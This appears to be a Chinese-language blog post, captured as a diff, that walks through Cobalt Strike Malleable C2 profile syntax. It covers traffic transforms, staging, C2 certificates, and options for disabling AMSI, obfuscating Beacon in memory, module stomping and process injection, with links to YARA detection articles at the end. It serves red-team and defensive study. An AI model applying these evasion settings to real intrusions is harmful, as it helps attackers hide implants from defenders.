+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/HuskyHacks/CobaltNotion" >HuskyHacks&#x2F;CobaltNotion <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - A spin-off research project. Cobalt Strike x Notion collab 2022</li>
+</ul>
+<p>辅助项目</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/CodeXTF2/Burp2Malleable" >CodeXTF2&#x2F;Burp2Malleable <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - Quick python utility I wrote to turn HTTP requests from burp suite into Cobalt Strike Malleable C2 profiles</li>
+</ul>
+<h3 id="Malleable-C2"><a href="#Malleable-C2" class="headerlink" title="Malleable C2"></a>Malleable C2</h3><p>Beacon 中的 http 通讯由 Malleable-C2 配置文件定义，在启动 teamserver 时来指定我们的配置文件, 每个 CS 只能载入一个配置文件, 多个文件需要启动多个 teamserver</p>
+<p>目录下的 c2lint 文件可以检测配置文件的语法问题和测试</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x c2lint</span><br><span class="line">./c2lint [/path/to/my.profile]</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="profile-语法"><a href="#profile-语法" class="headerlink" title="profile 语法"></a>profile 语法</h3><p><strong>简单举例</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># Backoff POS Malware</span><br><span class="line">#</span><br><span class="line"># This profile takes steps to dress up the POST side of Beacon&#x27;s C2 to</span><br><span class="line"># look like Backoff. The GET side is left generic.</span><br><span class="line">#</span><br></pre></td></tr></table></figure></div>
+
+<p>注释符号 <code>#</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set sample_name &quot;Backoff POS Malware&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;30000&quot;; # use a ~30s delay between callbacks</span><br><span class="line">set jitter    &quot;10&quot;;    # throw in a 10% jitter</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>选择赋值 <code>set</code> 用来设置一些程序的默认值 语句以; 结束,类似JavaScript.</p>
+<p>代码中 <code>set sleeptime &quot;30000&quot;;</code> 即为设置心跳时间为30000毫秒，<code>set jitter &quot;10&quot;;</code> 为默认抖动系数（0-99%）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set useragent &quot;Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0&quot;;</span><br></pre></td></tr></table></figure></div>
+
+<p>设置 user-agent</p>
+<p><strong>Data Transform Language</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">    set uri &quot;/updates&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbiosu;</span><br><span class="line">            prepend &quot;user=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/plain&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>数据转换,CS内置的几种编码</p>
+<table>
+<thead>
+<tr>
+<th>Statement</th>
+<th>Action</th>
+<th>Inverse</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>append “string”</td>
+<td>Append “string”</td>
+<td>Remove last LEN(“string”) characters</td>
+</tr>
+<tr>
+<td>base64</td>
+<td>Base64 Encode</td>
+<td>Base64 Decode</td>
+</tr>
+<tr>
+<td>base64url</td>
+<td>URL-safe Base64 Encode</td>
+<td>URL-safe Base64 Decode</td>
+</tr>
+<tr>
+<td>mask</td>
+<td>XOR mask w&#x2F; random key</td>
+<td>XOR mask w&#x2F; same random key</td>
+</tr>
+<tr>
+<td>netbios</td>
+<td>NetBIOS Encode ‘a’</td>
+<td>NetBIOS Decode ‘a’</td>
+</tr>
+<tr>
+<td>netbiosu</td>
+<td>NetBIOS Encode ‘A’</td>
+<td>NetBIOS Decode ‘A’</td>
+</tr>
+<tr>
+<td>prepend “string”</td>
+<td>Prepend “string”</td>
+<td>Remove first LEN(“string”) characters</td>
+</tr>
+</tbody></table>
+<p>数据转换语句可以任意数量顺序组合,以终止语句结束,在转换中只能使用一个终止语句</p>
+<table>
+<thead>
+<tr>
+<th>Statement</th>
+<th>What</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>header “header”</td>
+<td>Store data in an HTTP header</td>
+</tr>
+<tr>
+<td>parameter “key”</td>
+<td>Store data in a URI parameter</td>
+</tr>
+<tr>
+<td>print</td>
+<td>Send data as transaction body</td>
+</tr>
+<tr>
+<td>uri-append</td>
+<td>Append to URI</td>
+</tr>
+</tbody></table>
+<p>终止语句将转换后的数据储存到 Http 头中，参数终止语句将转换的数据 print 来最后发送这些编码的数据</p>
+<p>print 是 <code>http-get.server.output</code>，<code>http-post.server.output</code> 和 <code>http-stager.server.output</code> 的终止语句配合上文代码可以看出。</p>
+<p>其他块使用 <code>header</code>，<code>parameter</code>，<code>print</code> 和 <code>uri-append</code> <code>termination</code> 语句, 如果在 <code>http-post.client.output</code> 上使用 <code>header</code> <code>parameter</code> <code>uri append</code> <code>termination</code> 语句，beacon 会将其响应分块到一个合理的长度，以适应事务的一部分。</p>
+<p><strong>Strings</strong></p>
+<p>Beacon 的 Profile 语法可以多个地方使用 Strings</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Special Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>“\n”</td>
+<td>Newline character</td>
+</tr>
+<tr>
+<td>“\r”</td>
+<td>Carriage Return</td>
+</tr>
+<tr>
+<td>“\t”</td>
+<td>Tab character</td>
+</tr>
+<tr>
+<td>“\u####”</td>
+<td>A unicode character</td>
+</tr>
+<tr>
+<td>“\x##”</td>
+<td>A byte (e.g., \x41 &#x3D; ‘A’)</td>
+</tr>
+<tr>
+<td>“\“</td>
+<td>\</td>
+</tr>
+</tbody></table>
+<p><strong>Options</strong></p>
+<p>Beacon 的默认值, 分为全局和本地, 全局更改 Beacon 的设置，本地用于特定事务。</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Context</th>
+<th>Default Value</th>
+<th>Changes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>amsi_disable</td>
+<td>null</td>
+<td>false</td>
+<td>(Attempt to) disable AMSI for execute-assembly, powerpick, and psinject</td>
+</tr>
+<tr>
+<td>dns_idle</td>
+<td>null</td>
+<td>0.0.0.0</td>
+<td>IP address used to indicate no tasks are available to DNS Beacon; Mask for other DNS C2 values</td>
+</tr>
+<tr>
+<td>dns_max_txt</td>
+<td>null</td>
+<td>252</td>
+<td>Maximum length of DNS TXT responses for tasks</td>
+</tr>
+<tr>
+<td>dns_sleep</td>
+<td>null</td>
+<td>0</td>
+<td>Force a sleep prior to each individual DNS request. (in milliseconds)</td>
+</tr>
+<tr>
+<td>dns_stager_prepend</td>
+<td>null</td>
+<td>null</td>
+<td>Prepend text to payload stage delivered to DNS TXT record stager</td>
+</tr>
+<tr>
+<td>dns_stager_subhost</td>
+<td>null</td>
+<td>.stage.123456.</td>
+<td>Subdomain used by DNS TXT record stager.</td>
+</tr>
+<tr>
+<td>dns_ttl</td>
+<td>null</td>
+<td>1</td>
+<td>TTL for DNS replies</td>
+</tr>
+<tr>
+<td>host_stage</td>
+<td>null</td>
+<td>true</td>
+<td>Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.</td>
+</tr>
+<tr>
+<td>jitter</td>
+<td>null</td>
+<td>0</td>
+<td>Default jitter factor (0-99%)</td>
+</tr>
+<tr>
+<td>maxdns</td>
+<td>null</td>
+<td>255</td>
+<td>Maximum length of hostname when uploading data over DNS (0-255)</td>
+</tr>
+<tr>
+<td>pipename</td>
+<td>null</td>
+<td>msagent_##</td>
+<td>Name of pipe to use for SMB Beacon’s peer-to-peer communication. ## is replaced with a number unique to your team server.</td>
+</tr>
+<tr>
+<td>pipename_stager</td>
+<td>null</td>
+<td>status_##</td>
+<td>Name of pipe to use for SMB Beacon’s named pipe stager. ## is replaced with a number.</td>
+</tr>
+<tr>
+<td>sample_name</td>
+<td>null</td>
+<td>My Profile</td>
+<td>The name of this profile (used in the Indicators of Compromise report)</td>
+</tr>
+<tr>
+<td>sleeptime</td>
+<td>null</td>
+<td>60000</td>
+<td>Default sleep time (in milliseconds)</td>
+</tr>
+<tr>
+<td>spawnto_x86</td>
+<td>null</td>
+<td>%windir%\syswow64\rundll32.exe</td>
+<td>Default x86 program to open and inject shellcode into</td>
+</tr>
+<tr>
+<td>spawnto_x64</td>
+<td>null</td>
+<td>%windir%\sysnative\rundll32.exe</td>
+<td>Default x64 program to open and inject shellcode into</td>
+</tr>
+<tr>
+<td>tcp_port</td>
+<td>null</td>
+<td>4444</td>
+<td>TCP Beacon listen port</td>
+</tr>
+<tr>
+<td>uri</td>
+<td>http-get,http-post</td>
+<td>[required option]</td>
+<td>Transaction URI</td>
+</tr>
+<tr>
+<td>uri_x86</td>
+<td>http-stager</td>
+<td>null</td>
+<td>x86 payload stage URI</td>
+</tr>
+<tr>
+<td>uri_x64</td>
+<td>http-stager</td>
+<td>null</td>
+<td>x64 payload stage URI</td>
+</tr>
+<tr>
+<td>useragent</td>
+<td>null</td>
+<td>Internet Explorer (Random)</td>
+<td>Default User-Agent for HTTP comms.</td>
+</tr>
+<tr>
+<td>verb</td>
+<td>http-get,http-post</td>
+<td>GET,POST</td>
+<td>HTTP Verb to use for transaction</td>
+</tr>
+</tbody></table>
+<p><strong>Beacon HTTP Transaction</strong></p>
+<p>HTTP请求 参数</p>
+<table>
+<thead>
+<tr>
+<th>Request</th>
+<th>Component</th>
+<th>Block</th>
+<th>Data</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http-get</td>
+<td>client</td>
+<td>metadata</td>
+<td>Session metadata</td>
+</tr>
+<tr>
+<td>http-get</td>
+<td>server</td>
+<td>output</td>
+<td>Beacon’s tasks</td>
+</tr>
+<tr>
+<td>http-post</td>
+<td>client</td>
+<td>id</td>
+<td>Session ID</td>
+</tr>
+<tr>
+<td>http-post</td>
+<td>client</td>
+<td>output</td>
+<td>Beacon’s responses</td>
+</tr>
+<tr>
+<td>http-post</td>
+<td>server</td>
+<td>output</td>
+<td>Empty</td>
+</tr>
+<tr>
+<td>http-stager</td>
+<td>server</td>
+<td>output</td>
+<td>Encoded payload stage</td>
+</tr>
+</tbody></table>
+<p><strong>HTTP Staging</strong></p>
+<p>Beacon 是一个分阶段的 payload，有效负载由 stager 下载并注入内存，在目标内存中有 Beacon 之前 HTTP GET 和 HTTP POST 不会生效。 Malleable C2 的 http-stager 块可自定义 HTTP 分段过程。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line">      set uri_x86 &quot;/get32.gif&quot;;</span><br><span class="line">      set uri_x64 &quot;/get64.gif&quot;;</span><br></pre></td></tr></table></figure></div>
+
+<p>uri_x86 选项设置 URI 下载 x86 的 payload,uri_x64 选项设置 URI 下载 64 位的 payload 。</p>
+<p><strong>Self-signed Certificates with SSL Beacon</strong></p>
+<p>HTTPS Beacon 在其通信中使用 HTTP Beacon 的指示符, Malleable C2 配置文件还可以指定 Beacon C2 服务器的自签名 SSL 证书的参数。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">      set CN       &quot;bobsmalware.com&quot;;</span><br><span class="line">      set O        &quot;Bob&#x27;s Malware&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>证书参数</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Example</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>C</td>
+<td>US</td>
+<td>Country</td>
+</tr>
+<tr>
+<td>CN</td>
+<td>beacon.cobaltstrike.com</td>
+<td>Common Name; Your callback domain</td>
+</tr>
+<tr>
+<td>L</td>
+<td>Washington</td>
+<td>Locality</td>
+</tr>
+<tr>
+<td>O</td>
+<td>Strategic Cyber LLC</td>
+<td>Organization Name</td>
+</tr>
+<tr>
+<td>OU</td>
+<td>Certificate Department</td>
+<td>Organizational Unit Name</td>
+</tr>
+<tr>
+<td>ST</td>
+<td>DC</td>
+<td>State or Province</td>
+</tr>
+<tr>
+<td>validity</td>
+<td>365</td>
+<td>Number of days certificate is valid for</td>
+</tr>
+</tbody></table>
+<p><strong>Valid SSL Certificates with SSL Beacon</strong></p>
+<p>可以选择将有效 SSL 证书与 Beacon 一起使用。使用 Malleable C2 配置文件指定 Java 密钥库文件和密码。此密钥库必须包含证书的私钥，根证书，任何中间证书以及 SSL 证书供应商提供的域证书。</p>
+<p>Cobalt Strike 在与 Malleable C2 配置文件相同的文件夹中找到 Java Keystore 文件。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">      set keystore &quot;domain.store&quot;;</span><br><span class="line">      set password &quot;mypassword&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Example</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Option</td>
+<td>Example</td>
+<td>Description</td>
+</tr>
+<tr>
+<td>keystore</td>
+<td>domain.store</td>
+<td>Java Keystore file with certificate information</td>
+</tr>
+<tr>
+<td>password</td>
+<td>mypassword</td>
+<td>The password to your Java Keystore</td>
+</tr>
+</tbody></table>
+<p>创建用于 Cobalt Strike 的 Beacon 的有效 SSL 证书的步骤</p>
+<ol>
+<li><p>使用 keytool 程序创建 Java 密钥存储文件。这个程序会询问 “你的姓名是什么？” 确保使用完全权威的域名来响应 Beacon 服务器。另外，请确保记下密钥库密码, 你以后会需要它。</p>
+<p><code>$ keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store</code></p>
+</li>
+<li><p>使用 keytool 生成证书签名请求（CSR）, 您将向您的 SSL 证书供应商提交此文件, 他们将验证您的身份并颁发证书, 有些供应商比其他供应商更容易和便宜。</p>
+<p><code>$ keytool -certreq -keyalg RSA -file domain.csr -keystore domain.store</code></p>
+</li>
+<li><p>导入 SSL 供应商提供的 Root 和任何中间证书。</p>
+<p><code>$ keytool -import -trustcacerts -alias FILE -file FILE.crt -keystore domain.store</code></p>
+</li>
+<li><p>最后，您必须安装域证书。</p>
+<p><code>$ keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store</code></p>
+</li>
+</ol>
+<p>就是这样就生成 Cobalt Strike 的 Beacon 一起使用的 Java Keystore 文件。</p>
+<p><strong>Code Signing Certificate</strong></p>
+<p>提供签署可执行文件或 DLL 文件的选项, 需要 代码签名证书和私钥指定 Java Keystore 文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">code-signer &#123;</span><br><span class="line">            set keystore &quot;keystore.jks&quot;;</span><br><span class="line">            set password &quot;password&quot;;</span><br><span class="line">            set alias    &quot;server&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Example</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>alias</td>
+<td>server</td>
+<td>The keystore’s alias for this certificate</td>
+</tr>
+<tr>
+<td>digest_algorithm</td>
+<td>SHA256</td>
+<td>The digest algorithm</td>
+</tr>
+<tr>
+<td>keystore</td>
+<td>keystore.jks</td>
+<td>Java Keystore file with certificate information</td>
+</tr>
+<tr>
+<td>password</td>
+<td>mypassword</td>
+<td>The password to your Java Keystore</td>
+</tr>
+<tr>
+<td>timestamp</td>
+<td>false</td>
+<td>Timestamp the file using a third-party service</td>
+</tr>
+<tr>
+<td>timestamp_url</td>
+<td><a class="link"   target="_blank" rel="noopener" href="http://timestamp.digicert.com/" >http://timestamp.digicert.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
+<td>URL of the timestamp service</td>
+</tr>
+</tbody></table>
+<p><strong>PE and Memory Indicators</strong></p>
+<p>Malleable C2 stage http-stager 控制 Beacon 如何加载到内存中并编辑 Beacon DLL 的内容。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">stage &#123;</span><br><span class="line">            set userwx &quot;false&quot;;</span><br><span class="line">            set compile_time &quot;14 Jul 2009 8:14:00&quot;;</span><br><span class="line">            set image_size_x86 &quot;512000&quot;;</span><br><span class="line">            set image_size_x64 &quot;512000&quot;;</span><br><span class="line">            set obfuscate &quot;true&quot;;</span><br><span class="line"></span><br><span class="line">            transform-x86 &#123;</span><br><span class="line">                        prepend &quot;\x90\x90&quot;;</span><br><span class="line">                        strrep &quot;ReflectiveLoader&quot; &quot;DoLegitStuff&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            transform-x64 &#123;</span><br><span class="line">                        # transform the x64 rDLL stage</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            stringw &quot;I am not Beacon!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>当接受后将字符串添加到 beacon dll 的. rdata 部分，string 命令添加一个以 zero-terminated 的字符串。stringw 命令添加了一个宽（utf-16le 编码）字符串,Transform-x86 和 Transform-X64 阻止 PAD 和 Transform Beacon 的反射 DLL 阶段。这些块支持三个命令：prepend、append 和 strrep.</p>
+<p>prepend 命令在 beacon 的反射 dll 之前插入一个字符串, append 命令在 beacon-reflective dll 后面添加一个字符串, 确保预先准备好的数据是阶段体系架构（x86、x64）的有效代码, c2lint 程序没有对此进行检查, strrep 命令替换 beacon 反射 dll 中的字符串。</p>
+<p>stage 块接受 Beacon DLL 内容的选项:</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Example</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>checksum</td>
+<td>0</td>
+<td>The CheckSum value in Beacon’s PE header</td>
+</tr>
+<tr>
+<td>cleanup</td>
+<td>false</td>
+<td>Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it.</td>
+</tr>
+<tr>
+<td>compile_time</td>
+<td>14 July 2009 8:14:00</td>
+<td>The build time in Beacon’s PE header</td>
+</tr>
+<tr>
+<td>entry_point</td>
+<td>92145</td>
+<td>The EntryPoint value in Beacon’s PE header</td>
+</tr>
+<tr>
+<td>image_size_x64</td>
+<td>512000</td>
+<td>SizeOfImage value in x64 Beacon’s PE header</td>
+</tr>
+<tr>
+<td>image_size_x86</td>
+<td>512000</td>
+<td>SizeOfImage value in x86 Beacon’s PE header</td>
+</tr>
+<tr>
+<td>module_x64</td>
+<td>xpsservices.dll</td>
+<td>Same as module_x86; affects x64 loader</td>
+</tr>
+<tr>
+<td>module_x86</td>
+<td>xpsservices.dll</td>
+<td>Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.</td>
+</tr>
+<tr>
+<td>name</td>
+<td>beacon.x64.dll</td>
+<td>The Exported name of the Beacon DLL</td>
+</tr>
+<tr>
+<td>obfuscate</td>
+<td>false</td>
+<td>Obfuscate the Reflective DLL’s import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.</td>
+</tr>
+<tr>
+<td>rich_header</td>
+<td>null</td>
+<td>Meta-information inserted by the compiler</td>
+</tr>
+<tr>
+<td>sleep_mask</td>
+<td>false</td>
+<td>Obfuscate Beacon, in-memory, prior to sleeping</td>
+</tr>
+<tr>
+<td>stomppe</td>
+<td>true</td>
+<td>Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload</td>
+</tr>
+<tr>
+<td>userwx</td>
+<td>false</td>
+<td>Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory</td>
+</tr>
+</tbody></table>
+<p><strong>Cloning PE Headers</strong></p>
+<p>Cobalt Strike 的 Linux 软件包, 包括一个工具 peclone，用于从 dll 中提取头文件并将其显示为一个随时可用的阶段块：</p>
+<p><code>./peclone [/path/to/sample.dll]</code></p>
+<p><strong>In-memory Evasion and Obfuscation</strong></p>
+<p>使用 stage 块的 prepend 命令来破坏分析，该分析扫描内存段的前几个字节以查找注入的 dll 的迹象。如果使用特定于工具的字符串检测代理，请使用 strrep 命令更改它们。</p>
+<p>如果 strrep 不够，请将 sleep_mask 设置为 true。这将引导信标在进入睡眠状态之前在记忆中模糊自己。在休眠之后，信标会将自己的模糊处理为请求和处理任务。SMB 和 TCP 信标在等待新连接或等待来自其父会话的数据时会使它们自己变得模糊。</p>
+<p>决定您希望在内存中看起来有多像一个 DLL。如果您希望方便检测，请将 stomppe 设置为 false。如果您想在内存中稍微混淆信标 dll，请将 stomppe 设置为 true。如果你想挑战，将 “模糊” 设置为“真”。此选项将采取许多步骤来模糊信标阶段和内存中 DLL 的最终状态。</p>
+<p>将 userwx 设置为 false 以询问 beacon 的加载器以避免 rwx 权限。具有这些权限的内存段将吸引分析师和安全产品的额外关注。</p>
+<p>默认情况下，Beacon 的加载程序使用 virtualloc 分配内存。模块踩踏是一种替代方法。将 module_x86 设置为一个大约是 beacon 有效载荷本身两倍大的 dll。Beacon 的 x86 加载程序将加载指定的 dll，在内存中查找其位置并覆盖它。这是一种在内存中定位信标的方法，Windows 将其与磁盘上的文件关联。您要驻留的应用程序不需要您选择的 DLL，这一点很重要。模块_x64 选项的情况相同，但它会影响 x64 信标。</p>
+<p>如果您担心在内存中初始化 beacon dll 的 beacon 阶段，请将 cleanup 设置为 true。此选项将在不再需要信标阶段时释放与之关联的内存。</p>
+<p><strong>Process Injection</strong></p>
+<p>Malleable C2 配置文件中的进程注入块可以注入内容并控制进程注入行为</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">process-inject &#123;</span><br><span class="line">            set min_alloc &quot;16384&quot;;</span><br><span class="line">            set startrwx &quot;true&quot;;</span><br><span class="line">            set userwx &quot;false&quot;;</span><br><span class="line"></span><br><span class="line">            transform-x86 &#123;</span><br><span class="line">                        prepend &quot;\x90\x90&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            transform-x64 &#123;</span><br><span class="line">                        # transform x64 injected content</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            disable &quot;CreateRemoteThread&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>transform-x86 和 transform-x64 阻止 Beacon 注入的 PAD 内容。这些块支持两个命令：prepend 和 append</p>
+<p>prepend 命令在插入的内容之前插入一个字符串。append 命令在注入的内容之后添加一个字符串。确保预先准备好的数据是注入内容体系结构（x86、x64）的有效代码。c2lint 程序没有对此进行检查。</p>
+<p>disable 语句是避免在 beacon 的进程注入例程中使用某些 API 的提示。您可以禁用：sethreadcontext、createRemoteThread 和 rtlcreateUserThread。请注意，当您禁用这些调用时，可能会在 Beacon 的进程注入例程中引入可避免的失败。c2lint 命令会发出一些警告。</p>
+<p>process-inject 块接受几个控制 Beacon 中的过程注入的选项</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Example</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>min_alloc</td>
+<td>4096</td>
+<td>Minimum amount of memory to request for injected content</td>
+</tr>
+<tr>
+<td>startrwx</td>
+<td>true</td>
+<td>Use RWX as initial permissions for injected content. Alternative is RW.</td>
+</tr>
+<tr>
+<td>userwx</td>
+<td>false</td>
+<td>Use RWX as final permissions for injected content. Alternative is RX.</td>
+</tr>
+</tbody></table>
+<p>compile_time参数</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ta2TBrJSWpaZ4J4b4fL8vA" >CS4.5修复C2Profile中本地时间不一致问题【增加convertDate】 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h2 id="C2-Sample-rule-样本规则"><a href="#C2-Sample-rule-样本规则" class="headerlink" title="C2 Sample rule-样本规则"></a>C2 Sample rule-样本规则</h2><p>目录中有一个 CobaltStrike.jar 文件，直接解压，这里面有一个名为 resources 的文件夹，就是 CobaltStrike 的配置信息，我们在 CobaltStrike 控制台生成的木马都来源于这个文件夹。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081612751.png"
+                     
+                ></p>
+<p>可以直接分析这里面的样本，提取规则进行查杀。</p>
+<h3 id="匹配CobaltStrike恶意样本"><a href="#匹配CobaltStrike恶意样本" class="headerlink" title="匹配CobaltStrike恶意样本"></a>匹配CobaltStrike恶意样本</h3><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/J0o1ey/p/15717342.html" >2021年 hw红队样本分析(三) - NimShellcodeLoader - J0o1ey - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/211501" >Yara入门——如何通过Yara规则匹配CobaltStrike恶意样本-安全客 - 安全资讯平台 (anquanke.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42814021/article/details/122671076" >样本分析] 海莲花CS样本_哎呀呀呀浅汐的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h2 id="Scripting-extensions-脚本拓展"><a href="#Scripting-extensions-脚本拓展" class="headerlink" title="Scripting extensions-脚本拓展"></a>Scripting extensions-脚本拓展</h2><h3 id="CNA-扩展"><a href="#CNA-扩展" class="headerlink" title="CNA 扩展"></a>CNA 扩展</h3><p>Cobalt Strike 可以使用 AggressorScripts 脚本来加强自身，能够扩展菜单栏，Beacon 命令行，提权脚本等</p>
+<p>相关文章</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm" >https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p>CS插件资源</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/rmikehodges/cs-ssl-gen" >rmikehodges&#x2F;cs-ssl-gen <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> sslgen 将安装一个 letsencrypt 证书并从中创建一个 Cobalt Strike 密钥库.</li>
